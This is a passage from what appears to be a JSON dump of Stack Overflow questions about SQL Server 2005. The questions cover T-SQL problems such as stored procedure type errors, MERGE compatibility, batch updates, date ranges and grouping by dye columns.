table:</p>\n\n<pre>\nName | Col1 | Col2 | Col3\nJohn   A      B      C\nJohn   A      D      A\nBill   A      A      D\nBill   F      A      A\nSteve  F      A      B\nSteve  C      C      A\n</pre>\n\n<p>I want to know a total of how many As John, Bill, and Steve have...</p>\n\n<p>e.g. John: 3, Bill: 4, Steve: 2</p>\n\n<p>How could I do this using T-SQL? Thanks.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12767344,"title":"SQL Server 2005 stored procedure error","body":"<p>I have created a stored procedure of insert command for employee details in SQL Server 2005 in which one of the parameters is an image for which I have used <code>varbinary</code> as the datatype in the table.. </p>\n\n<p>But when I am adding that parameter in the stored procedure I am getting the following error-</p>\n\n<blockquote>\n  <p><em>Implicit conversion from data type varchar to varbinary is not\n  allowed. Use the CONVERT function to run this query.</em></p>\n</blockquote>\n\n<p>Stored procedure:</p>\n\n<pre><code>( \n    @Employee_ID nvarchar(10)='', \n    @Password nvarchar(10)='', \n    @Security_Question nvarchar(50)='', \n    @Answer nvarchar(50)='', \n    @First_Name nvarchar(20)='',\n    @Middle_Name nvarchar(20)='', \n    @Last_Name nvarchar(20)='', \n    @Employee_Type nvarchar(15)='', \n    @Department nvarchar(15)='', \n    @Photo varbinary(50)='' \n)\n\ninsert into Registration\n(\n      Employee_ID,\n      Password,      \n      Security_Question,\n      Answer,\n      First_Name,\n      Middle_Name,\n      Last_Name,\n      Employee_Type,\n      Department,     \n      Photo     \n)\nvalues\n(\n      @Employee_ID,\n      @Password,     \n      @Security_Question,\n      @Answer,\n      @First_Name,\n      @Middle_Name,\n      @Last_Name,\n      @Employee_Type,\n      @Department,      \n      @Photo   \n     )\n</code></pre>\n\n<p>Table structure:</p>\n\n<pre><code>Column Name        Data Type                 Allow Nulls\nEmployee_ID    nvarchar(10)             Unchecked\nPassword       nvarchar(10)              Checked\nSecurity_Question   nvarchar(50)         Checked\nAnswer             nvarchar(50)              Checked\nFirst_Name     nvarchar(20)              Checked\nMiddle_Name    nvarchar(20)              Checked\nLast_Name      nvarchar(20)              Checked\nEmployee_Type      nvarchar(15)              Checked\nDepartment     nvarchar(15)              Checked\nPhoto              varbinary(50)         Checked\n</code></pre>\n\n<p>Code in vb.net for calling stored procedure-></p>\n\n<p>Public Function Submit(ByVal obj As UserData, ByVal opt As String) As Boolean</p>\n\n<pre><code>    Using cnn As New SqlConnection(conn)\n        Using cmd As New SqlCommand\n            cmd.Connection = cnn\n            If opt = \"Submit\" Then\n                cmd.CommandText = \"sp_emp_Registration\"\n            End If\n\n            cmd.CommandType = CommandType.StoredProcedure\n            cmd.Parameters.Add(New SqlParameter(\"@Employee_ID\", obj.EmpID))\n            cmd.Parameters.Add(New SqlParameter(\"@Password\", obj.Pwd))\n            cmd.Parameters.Add(New SqlParameter(\"@Security_Question\", obj.SecQues))\n            cmd.Parameters.Add(New SqlParameter(\"@Answer\", obj.Ans))\n            cmd.Parameters.Add(New SqlParameter(\"@First_Name\", obj.Firstname))\n            cmd.Parameters.Add(New SqlParameter(\"@Middle_Name\", obj.Middlename))\n            cmd.Parameters.Add(New SqlParameter(\"@Last_Name\", obj.Lastname))\n            cmd.Parameters.Add(New SqlParameter(\"@Employee_Type\", obj.EmpType))\n            cmd.Parameters.Add(New SqlParameter(\"@Department\", obj.dept))                \n            cmd.Parameters.Add(New SqlParameter(\"@Photo\", obj.photo))\n\n            cnn.Open()\n            Try\n                If (cmd.ExecuteNonQuery() &gt; 0) Then\n                    cnn.Close()\n                    Return True\n                Else\n                    Return False\n                End If\n            Catch ex As Exception\n                Return False\n            End Try\n        End Using\n    End Using\nEnd Function\n</code></pre>\n\n<p>I am not getting what to do..can anyone give me some suggestion or solution?\nThanks in advance.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12756320,"title":"SQL Server 2005 money format","body":"<p>I have been using SQL Server 2005, and I need to store some columns in database in <code>Money</code> format.</p>\n\n<p>But SQL Server stores them like this --> <code>0000.0000</code>, but I only want 2 digits after the decimal point  --->  <code>0000.00</code> </p>\n\n<p>Do I have to control this in the program or there is a way to change this format in SQL Server 2005 ? </p>\n\n<p>Thanks in advance </p>\n"},{"tags":["database","sql-server-2005","mdf"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2548,"score":3,"question_id":3498342,"title":"Where does SQL Server 2005 keep the .mdf files?","body":"<p>I'm upgrading from SQL Server 2005 to 2008.  I've detached the database I need, but can't find it on the file system. </p>\n\n<p>Where does a default installation of SQL Server 2005 store these?</p>\n"},{"tags":["sql-server-2005","systemtime"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":256,"score":1,"question_id":3703031,"title":"MS SQL 2005: Any way to temporarily set the system date for a T-SQL script to a different date?","body":"<p>We have a bunch of T-SQL scripts dependent on today's date and when they run.  If one doesn't run on the week it should, we end up temporarily setting the system time a day before, run the script, then set it back.</p>\n\n<p>Is there anyway to temporarily set the system date for a script without changing the original script, like when you execute it or only for that session?</p>\n"},{"tags":["sql","visual-studio-2010","sql-server-2005","database-project"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":179,"score":2,"question_id":12081856,"title":"Visual studio 2010 database project allowing stored procedure with invalid SQL to build","body":"<p>I have a database project that is specifed as 2005. (This is on the properties screen under the project settings. )</p>\n\n<p>We have several servers we deploy and run against production is 2005 but we have some 2008 R2 servers that we develop against so we specify the project as 2005.</p>\n\n<p>I have added stored proc which I created on a 2008R2 database which is used only for development. It all works fine so I added it to the database project. The project built and deployed fine meaning that it generates the .sql file. We do not apply changes from the VS Project.</p>\n\n<p>We have a CI TFS build that runs against a 2005 database. (we have several configurations and each 'deploys' against a different database). It built and deployed fine. Again it only generated the updates into an SQL file.</p>\n\n<p>The stored proc contains the following code:</p>\n\n<pre><code>    insert SiteCAChargeParameterSet\n    values (\n             ( select siteID \n                 from SiteCAChargeParameterSet\n                where SiteCAChargeParameterSetID = @OldSiteCAChargeParameterSet\n              ),\n                @NewSetName,0,0,@UserID, @currentDate,@UserID, @currentDate\n            )\n</code></pre>\n\n<p>All of the variables are defined.\nWhen I try to create this stored proc on the 2005 database I get an error (1046) that indicates that the select is not allowed \"Subqueries are not allowed in this context.\"</p>\n\n<p>My question is why does the compiler permit this. Clearly since I have indicated that this is a sql server 2005 project it should follow rules for that version. Further, since it is comparing against a 2005 database for the deploy is should also know that this is illegal. </p>\n\n<p>I am hoping thereis an option somewhere that I don't have turned on or something like that. \nOr is this just an error in the SQL 'compiler'.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":4,"favorite_count":8,"up_vote_count":10,"down_vote_count":42,"view_count":1102,"score":-32,"question_id":3448821,"title":"What is the best way to save the articles?","body":"<p>I am using WMD editor to post the article.</p>\n\n<p>Should I save the complete encoded HTML or only the text user entered into the editor and at the time of rendering the recond on page use the prityprint to colored it?</p>\n\n<p>OR</p>\n\n<p>Should I save the WMD output and render as it is on the page?</p>\n\n<p>OR</p>\n\n<p>We need to use a different editor text box on the page?</p>\n\n<p>OR</p>\n\n<p>Give suggestion to use the editor and save articles in database in the for of simple text or HTML?</p>\n\n<p>Thanks in advance!!!!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":8,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":9651,"score":11,"question_id":1883071,"title":"How do I find the data directory for a SQL Server instance?","body":"<p>We have a few <em>huge</em> databases (20GB+) which mostly contain static lookup data.  Because our application executes joins against tables in these databases, they have to be part of each developers local SQL Server (i.e. they can't be hosted on a central, shared database server).  </p>\n\n<p>We plan on copying a canonical set of the actual SQL Server database files (*.mdf and *.ldf) and attach them to each developer's local database.</p>\n\n<p>What's the best way to find out the local SQL Server instance's data directory so we can copy the files to the right place?  This will be done via an automated process, so I have to be able to find and use it from a build script.</p>\n"},{"tags":["c#","asp.net","sql","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":388,"score":0,"question_id":7753642,"title":"Database wrapper like Massive by Rob Conery for SQL Server 2005 and ASP.NET 2.0","body":"<p>Yes I still use the older version of the .NET Framework &amp; love it. Would like to use a database wrapper now <a href=\"https://github.com/robconery/massive\" rel=\"nofollow\">massive</a> by rob is awesome if I had 3.5 but Nooooo.</p>\n\n<ul>\n<li>You got any suggestions for a database wrapper ? </li>\n</ul>\n\n<p>Please don't suggest a ORM(ex NHibernate, Active Record) all we do is write stored procedures and supply them parameters in our data access layer. Nothing more nothing less, we are thinking of abstracting away parameters as object now thinking wrapper might be out there or rolling out our own.</p>\n"},{"tags":["sql-server-2005","ssis","import","append","dts"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1869,"score":2,"question_id":3425883,"title":"SSIS 2005: \"Append rows to the destination table\" is greyed out. Why?","body":"<p>In SQL Server 2005, Import Data (SSIS), my desire is to import a text file and have it append to an existing table.   The first time through the wizard on the Column Mappings step I swear the <strong>Append rows to the destination table</strong> radio button was enabled.  But, now, it's disabled (grey) and even re-starting the wizard won't cause it to re-enable.</p>\n\n<p>Is there some secret/magic I don't know about?  How do I get that option to re-enable so that I can append (rather than <strong>Create destination table</strong>)? </p>\n"},{"tags":["sql","sql-server-2005","inner-join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12753511,"title":"Bad row estimates joining two tables on date range","body":"<h2>Tables</h2>\n\n<ul>\n<li>TEST_RUNS (ID int, Date_Time datetime, Row1 int, Row2 int, Row3 int, Row4 int)</li>\n<li>ADMIN_TIME_FILTER (ID int, Name varchar(20), Start_Date datetime, End_Date datetime)</li>\n</ul>\n\n<p><strong>ADMIN_TIME_FILTER</strong> holds a small list of shifting date ranges that get updated frequently via automation.  We have common date ranges (ThisYear, ThisDay, etc) and some more esoteric ranges.  This table exists strictly as a way to filter data out of TEST_RUNS in a join.</p>\n\n<p><strong>TEST_RUNS</strong> holds actual data we care about, and has millions of rows.  We have a bunch of defined views joining these two tables together, so we can just update the ADMIN_TIME_FILTER table and have the changes propagate to the views.  Aside from date, there are no rows that link these two tables together.</p>\n\n<h2>Queries</h2>\n\n<p>The problem is that the estimated row count is widly off, resulting in poor performing queries.  Here's a simple query the exhibits the bad estimate:</p>\n\n<pre><code>with test as (\n    SELECT a.* FROM TEST_RUNS a\n    INNER JOIN ADMIN_TIME_FILTER b ON b.ID = 5 -- ID for ThisYear range\n       AND a.date_time BETWEEN b.start_date AND b.end_date\n)\nselect count(*) from test \n</code></pre>\n\n<p>Here's the query plan:</p>\n\n<p><img src=\"http://i.stack.imgur.com/YT7ZQ.png\" alt=\"queryplan\"></p>\n\n<p>Statistics aren't the problem.  I can run the following query and get an accurate row estimate</p>\n\n<pre><code>with test as (\n    select tr.* from test_runs tr\n    where tr.date_time between '2012-01-01 00:00:00' and '2012-12-31 00:00:00'\n)\nselect count(*) from test\n</code></pre>\n\n<h2>Help</h2>\n\n<p>Switching away from our join methodology isn't a simple task, so I'm looking for an alternative to improve the row estimate.</p>\n\n<p>Indexed views don't appear to be a viable option due to the performance implications.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12752136,"title":"What is the best way to get start date and end date of the week between two dates in SQL","body":"<p>I work with SQL Server 2005. I have a start and end date.</p>\n\n<p>Ex:</p>\n\n<pre><code>START_DATE    END_DATE\n2011-04-24    2012-05-05 \n</code></pre>\n\n<p>I want to get all the start day (SQL is set so that it's sunday) and end day (saturday) of each week between the two dates.</p>\n\n<p>Desired result :</p>\n\n<pre><code>2011-04-24    2011-04-30\n2011-05-01    2011-05-07\n2011-05-08    2011-05-14\n....\n2012-04-29    2012-05-05\n</code></pre>\n\n<p>Now I know I could do something like <code>DATEADD(week, 1, 2011-04-24)</code> until I get to my end date, but I don't quite see how to do it until I get to my end date (without having a cursor or a while). I would like to do it in one query.</p>\n\n<p>Can anyone help?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12753513,"title":"Single rowset in variable","body":"<p>I m stuck at this place. I m trying to get a single rowset value in a variable.</p>\n\n<pre><code>DECLARE @last_timestamp as varchar;\nSET @last_timestamp = SELECT MAX(modify_timestamp) FROM dbo.table1\nPRINT @last_timestamp\n</code></pre>\n\n<p>It is returning the below error</p>\n\n<pre><code>Msg 156, Level 15, State 1, Line 2\nIncorrect syntax near the keyword 'SELECT'.\n</code></pre>\n\n<p>Is Cursor the only solution to this problem. Any help would be helpful ?</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12752515,"title":"VB6 How to catch an ADO Command Timeout error and display custom MsgBox","body":"<p>I have looked through all of the VB6 Error Numbers to no avail, and it seems the command object itself takes care of the error messagebox in the background. What I need to know is if their is someway to change the MsgBox for the ADODB.CommandTimeout error itself. My first thoughts were to just catch the error (using error numbers) and then set a MsgBox that way. However, I can't find any documentation on any error numbers handling ADO Events. Any suggestions?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":454,"score":2,"question_id":2644281,"title":"How many maximum recursion possible for CTE in SQL server?","body":"<p>How many maximum recursion level possible for CTE in SQL server? If maximum recursion level is reached then what are the alternative way?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12751126,"title":"Join two select queries together","body":"<p>I have two select queries that I need to combine....</p>\n\n<pre><code>  SELECT [DatapointID]\n  ,[AssetID]\n  ,[DatapointID]\n  ,[SourceTag]\n  ,'-' + [TimeStep] + [TimeStepValue] AS TimeStep\n  ,[DataRetrievalInterval] + [DataRetrievalIntervalValue] AS [RetInterval]\n  ,NULL AS DatapointDate\n  ,NULL AS DatapointValue\n  ,0 As DataFlagID\n  ,DateADD(-1, d @SearchDateEnd) + @SearchTimeEnd DateDataGrabbed\n  ,GetDate() DateTimeAddedtoDB\nFROM [dbo].[tblTSS_Assets_Datapoints]\nWhere AssetID = 204     \n\n\nSelect DatapointDate, SUM(DataPointValue) as DataPointValue From @temp\nGROUP BY DatapointDate\nORDER BY DatapointDate\n</code></pre>\n\n<p>The first select query is what I want the end result to be however instead of NULL As the DatapointDate and DatapointValue I want the values from the @temp</p>\n\n<p>How can I do this?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12742197,"title":"Combining 2 one columns statements into 1 two column statement","body":"<p>Let say I have two select statements (This is  just an example. Data could be text also):</p>\n\n<pre><code> S1        S2\n| 1 |    | a |\n| 2 |    | b |  \n| 3 |    | c |\n| 4 |    | d |\n| 5 |    | e |\n</code></pre>\n\n<p>How can I \"glue\" them together into one statement but with one column each like this:</p>\n\n<pre><code> S1         S2          S3\n| 1 |     | a |     | 1   a |\n| 2 |     | b |     | 2   b |  \n| 3 |  +  | c |  =  | 3   c |  \n| 4 |     | d |     | 4   d |\n| 5 |     | e |     | 5   e |\n</code></pre>\n\n<p>And if that is even possible, will it be resistant to null or empty statements like this?:</p>\n\n<pre><code> S1         S2           S3\n| 1 |     |NULL|     | 1  NULL|\n| 2 |                | 2  NULL|\n| 3 |  +          =  | 3  NULL|\n| 4 |                | 4  NULL|\n| 5 |                | 5  NULL|\n</code></pre>\n\n<p>The two statements have no keys, but do belong to each other row wise (unless one of them is null). </p>\n\n<p>I know this can be done using while loops, cursors and temp tables. The problem is I need this to be fast and don't use that many resources, because this statement will be fired a lot. Maybe some of you know a neat trick to achieve this or have a suggestion how solve it?</p>\n\n<p><strong>What is this used for?:</strong>\nWhat this solution is for is a log system that need to take the trigger tables UPDATED and INSERTED, translate each row into a XML part and put them into a temporary table with the XML values or null (depending on the changed action on that particular table).</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["sql-server-2005","visual-web-developer-2010"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12750842,"title":"VSWDExpress 2010 - How to attach SQL Server 2005 database located on a different server","body":"<p>I have VSWD Express installed on Windows Server 2008. I created a MVC3 project on a Windows 7 machine with a SQL Express database. I moved that project to the server, and I'm getting an error that it can't find my database.</p>\n\n<p>This makes sense, because I didn't install the SQL Server Express onto the server. However, instead of using the Express database, I want to use an existing SQL Server 2005 database. However, this is also not installed on this particular web server, it's on another server.</p>\n\n<p>How can I use the SQL Server 2005 database without installing SQL Server 2005 onto the web server?</p>\n\n<p>TIA :)</p>\n"},{"tags":["sql-server-2008","sql-server-2005","merge"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12353514,"title":"SQL 2008 Merge Statement - 2008 Source - 2005 Target","body":"<p>Is it safe to say that if I'm trying to create a MERGE statment and run from SQL 2008, both the source and target database must be SQL 2008 or later?</p>\n\n<p>I'm trying to run a MERGE statement on SQL 2008 where the source is a SQL 2008 database and the target is 2005...but I get red squiggles under all 2005 table references.</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12749360,"title":"Restrict access to SQL SERVER 2005 or 2008 Express database to my c# app","body":"<p>I've always found answers here without having to open a thread, but this time I really need advice from specialists.</p>\n\n<p>My Windows Software creates a SQL Server Express Database as it installs, using scripts, and a IIS Server providing data to users through an extranet web-application.</p>\n\n<p>Database engine can be SQL Server 2005 Express or 2008 Express.</p>\n\n<p>My problematic is the following : I want to restrict access to the database to my IIS server, but I can't use a specific Windows account authentication. I actually use the default windows profile but it's of course not a good solution.</p>\n\n<p>I can't use TDE because of eventuality of 2005 database. I don't want to use CDE because of Indexing loose and performance issues.</p>\n\n<p>I of course can't specify database parameters manually.</p>\n\n<p>Is there a way to create schema or SQL Server user from my c# app, and makes my code the only accessor (except local administrators of the computer of course) to my database ?</p>\n\n<p>What my possibilities are? Which one do would you suggest me?</p>\n"},{"tags":["python","sql-server-2005","iis7","pyodbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12736248,"title":"pyodbc connection to MSSQL 2005 server via IIS7","body":"<p>I have IIS7 installed and configured on my laptop and with a python cgi interface.   I can run the python script from within Eclipse and get the results I am looking for from the database.  But when I run the script from the webpage I get an authentication error.  It seems that the connection string is not passing the credentials to the SQL server.  Any thoughts?</p>\n\n<pre><code>import pyodbc\nimport cgi\nimport cgitb; cgitb.enable()\n\ncnxn = pyodbc.connect(driver='{SQL Server}', \n                  server='SERVER\\INSTANCE', \n                  Trusted_Connection='yes', \n                  database='Test_Chad', \n                  uid='SERVER\\username', \n                  pwd='password')\n\ndef getRow():\n    cursor = cnxn.cursor()\n    cursor.execute(\"select user_id, user_name from users\")\n    row = cursor.fetchone()\n    print 'name:', row.user_id     \n    print 'name:', row.user_name\n\ngetRow()\n</code></pre>\n\n<p>Exception:</p>\n\n<pre><code>&lt;class 'pyodbc.Error'&gt;: ('28000', \"[28000] [Microsoft][ODBC SQL Server Driver][SQL Server]Login failed for user 'NT AUTHORITY\\\\ANONYMOUS LOGON'.\n(18456) (SQLDriverConnect); [28000] [Microsoft][ODBC SQL Server Driver][SQL Server]Login failed for user 'NT AUTHORITY\\\\ANONYMOUS LOGON'. (18456)\") \nargs = ('28000', r\"[28000] [Microsoft][ODBC SQL Server Driver][SQL ... for user 'NT AUTHORITY\\ANONYMOUS LOGON'. (18456)\") \nmessage = ''\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","merge"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12746457,"title":"Adaptation of the merge clauses in SQL Server 2005","body":"<p>I have a code which is up and running but the problem that I have is that it includes a lot of MERGE clauses as it was intended to be run from SQL Server 2008 and forward. But the problem is that a new customer is running SQL Server 2005 and as you know the Merge clause is not available till SQL Server 2008, so my question is if there is not a way to parse the this clauses automatically or if there is another solution (apart from rewriting all the clauses in clasical clauses ) as the customer is not willing to upgrade the DB.</p>\n\n<p>Thanks a lot in advance. </p>\n"},{"tags":["sql","sql-server-2005","reporting-services","subscription","data-driven"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12746748,"title":"Datadriven subscription error - SQL Server 2005","body":"<p>I am using SQL Server 2005.</p>\n\n<p>Connecting to: Reporting Services...</p>\n\n<p>Home folder -> I have my report: \"Report1\"</p>\n\n<p>For \"Report1\" I can add Subscriptions -> Data Driven Subscription...</p>\n\n<p>I go through the whole process and set a schedule to run at 12:00, 1st every month. And everything goes fine.</p>\n\n<p>But then when I look at the schedule again for the Data Driven Subscription, because the report is sent at 00:00 instead of 12:00.</p>\n\n<p>I go to the subscription notice the time has changed to 00:00 on 1.1.0001 (pic1)and get the following error when I want to set the schedule again(pic2):</p>\n\n<p><img src=\"http://i.stack.imgur.com/aTnc3.jpg\" alt=\"enter image description here\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/rdYfP.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":11,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":5871,"score":12,"question_id":3711217,"title":"Fastest way to update 120 Million records","body":"<p>I need to initialize a new field with the value -1 in a 120 Million record table.</p>\n\n<p>Update table\nset int_field = -1;</p>\n\n<p>I let it run for 5 hours before canceling it.</p>\n\n<p>I tried running it with transaction level set to read uncommitted with the same results.</p>\n\n<p>Recovery Model = Simple.</p>\n\n<p>MS SQL Server 2005</p>\n\n<p>Any advice on getting this done faster?</p>\n\n<p><strike>THANKS!\nDoing it in batches with top(N) seems to be working.  I used this code:</p>\n\n<pre><code>--for tracking batch perfomance\ncreate table ##counter (n int null,dt datetime default getdate() null)\n\ndeclare @rows int\nset @rows = 1\n\nwhile @rows &lt;&gt; 0\nbegin\n\n    begin transaction b\n\n    update top (1000000) dbo.TABLE\n       set int_field = -1\n     where int_field is null\n\n    set @rows = @@rowcount\n\n    insert into ##counter (n) values (@rows)\n\n    commit transaction b\n\nend\n</code></pre>\n\n<p>It's running at about a minute per batch so it should be done in 2 hours, not 5+.  I could probably tweak further.</strike></p>\n\n<p>Processing times began to tank (10 minutes per batch) after the first couple dozen.</p>\n\n<p>Good try though.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":10,"view_count":54,"score":-10,"question_id":12746509,"title":"Gridview With Hyperlink in asp.net","body":"<p>I have one Table in my project which contains taskid, subject, message and date.\nand according to task_id, everyone can discuss on that task.\nso i have added new table in sql server.</p>\n\n<p>now i want to put list of all task in gridview.\ngridview contains hyperlink on each row.\nand on click on any row it will load new table of discussion on that particular task.</p>\n\n<p>how can i do this? </p>\n"},{"tags":["sql","sql-server-2005","tsql","constraints","foreign-key-relationship"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1431,"score":1,"question_id":5416926,"title":"Self referencing foreign-key constraints and delete","body":"<p>what is the recommended way to handle self-referencing foreignkey constraints in SQL-Server?</p>\n\n<p>Table-Model:</p>\n\n<p><img src=\"http://i.stack.imgur.com/MHdmX.jpg\" alt=\"enter image description here\"></p>\n\n<p><code>fiData</code> references a previous record in tabData. If i delete a record that is referenced by <code>fiData</code>, the database throws an exception: <code>\"The DELETE statement conflicted with the SAME TABLE REFERENCE constraint \"FK_tabDataPrev_tabDataNext\". The conflict occurred in database \"MyDataBase\", table \"dbo.tabData\", column 'fiData'\"</code> if <code>Enforce Foreignkey Constraint</code> is set to \"Yes\".</p>\n\n<p>I don't need to cascade delete records that are referenced but i would need to set <code>fiData=NULL</code> where it's referenced. My idea is to set <code>Enforce Foreignkey Constraint</code> to \"No\" and create a delete-trigger. Is this recommendable or are there better ways?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":89,"score":6,"question_id":12744444,"title":"Select second highest value per distinct foreign key","body":"<p>So, I have two tables, account and invoice, they are linked by the primary key from the account table ie. account.key and invoice.key. </p>\n\n<p>I want to select account.accountnumber, invoice.invoicedate, invoice.invoiceamount for the second latest invoicedate from each account.</p>\n\n<p>Any ideas?</p>\n\n<p>So to select all invoices and their corresponding account numbers:</p>\n\n<pre><code>select a.accountnumber, i.invoicedate, i.invoiceamount\nfrom account a\njoin invoice i on (a.key = i.key)\n</code></pre>\n\n<p>And to select the second latest invoice from the entire invoice table:</p>\n\n<pre><code>select MAX(invoicedate) from INVOICE i where invoicedate NOT IN (SELECT MAX(invoicedate) from i\n</code></pre>\n\n<p>But how do I get the second latest invoice, per account from the invoice table, along with the account number from the account table?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12743023,"title":"SQL Server 2005 : change collation for the existing database and LINQ2SQL","body":"<p>I have a SQL Server 2005 database. It was created with default collation which is not case-sensitive (my fault!). That's different from all other databases which I work with, where collations are by default case sensitive. I mostly consider comparing strings than sorting. I use Linq-to-SQL where there is no way to specify collation for <code>WHERE</code> clause.</p>\n\n<p>It seems that changing collation of existing database / server (and all tables' fields!) is error-prone and there is no tools for this.</p>\n\n<p>Maybe I'm missing something and there is a clean way?</p>\n"},{"tags":["sql","sql-server-2005","text","occurences"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":814,"score":1,"question_id":3778137,"title":"How to count the occurrences of a string inside TEXT datatype in sql server 2005","body":"<p>There is a column of datatype TEXT in my table. Now, I need to find the number of occurrences of a string in that TEXT field.\nI have already created a Full-text index on that table. But I don't know how to proceed further. \nI already found ways to count string occurrences for VARCHAR. But they cannot be applied AS IS to TEXT field. Any suggestions?</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12727942,"title":"Can I Group By an Unknown Number of Columns?","body":"<p>I am currently trying to re-write a stored procedure to take into account the normalisation of one of our tables. In the original procedure we have two tables:    </p>\n\n<pre><code>CREATE TABLE #t_batch\n(batch_id   integer, \nthread_group NVARCHAR(60),\ndye_code_1  NVARCHAR(10),\ndye_conc_1  NUMERIC(19, 7),\ndye_code_2  NVARCHAR(10),\ndye_conc_2  NUMERIC(19, 7),\ndye_code_3  NVARCHAR(10),\ndye_conc_3  NUMERIC(19, 7),\ndye_code_4  NVARCHAR(10),\ndye_conc_4  NUMERIC(19, 7),\ndye_code_5  NVARCHAR(10),\ndye_conc_5  NUMERIC(19, 7),\ndye_code_6  NVARCHAR(10),\ndye_conc_6  NUMERIC(19, 7))\n\nCREATE TABLE #t_group\n(group_id   INTEGER IDENTITY(1, 1),\ndye_code_1  NVARCHAR(10),\ndye_conc_1  NUMERIC(19, 7),\ndye_code_2  NVARCHAR(10),\ndye_conc_2  NUMERIC(19, 7),\ndye_code_3  NVARCHAR(10),\ndye_conc_3  NUMERIC(19, 7),\ndye_code_4  NVARCHAR(10),\ndye_conc_4  NUMERIC(19, 7),\ndye_code_5  NVARCHAR(10),\ndye_conc_5  NUMERIC(19, 7),\ndye_code_6  NVARCHAR(10),\ndye_conc_6  NUMERIC(19, 7),\nthread_group NVARCHAR(60), \nnum_batches INTEGER)\n</code></pre>\n\n<p>After a number of actions #t_batch was populated with a number of records. We then inserted data into #t_group in the following way:</p>\n\n<pre><code>INSERT INTO #t_group\n(dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3,\ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group, num_batches)\nSELECT dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group, COUNT(batch_id_fk)\nFROM #t_batch\nGROUP BY dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group\nORDER BY dye_code_1, dye_conc_1, dye_code_2, dye_conc_2, dye_code_3, dye_conc_3, \ndye_code_4, dye_conc_4, dye_code_5, dye_conc_5, dye_code_6, dye_conc_6, \nthread_group\n</code></pre>\n\n<p>So, we had a series of records that are grouped by the dye columns and a unique group_id for each unique combination of dyes and their concentrations. Also, there is a count of the batch records for each group. </p>\n\n<p>However, since there is in reality no limit to the number of dyes for a batch the tables have been normalised:</p>\n\n<pre><code>CREATE TABLE #t_batch\n(batch_id   INTEGER, \nthread_group NVARCHAR(60))\n\nCREATE TABLE #t_batch_dye\n(batch_id_fk INTEGER, \nstage   INTEGER,\nsequence    INTEGER, \ndye_code    NVARCHAR(10),\ndye_conc    NUMERIC(19,7))\n\nCREATE TABLE #t_group\n(group_id   INTEGER IDENTITY(1, 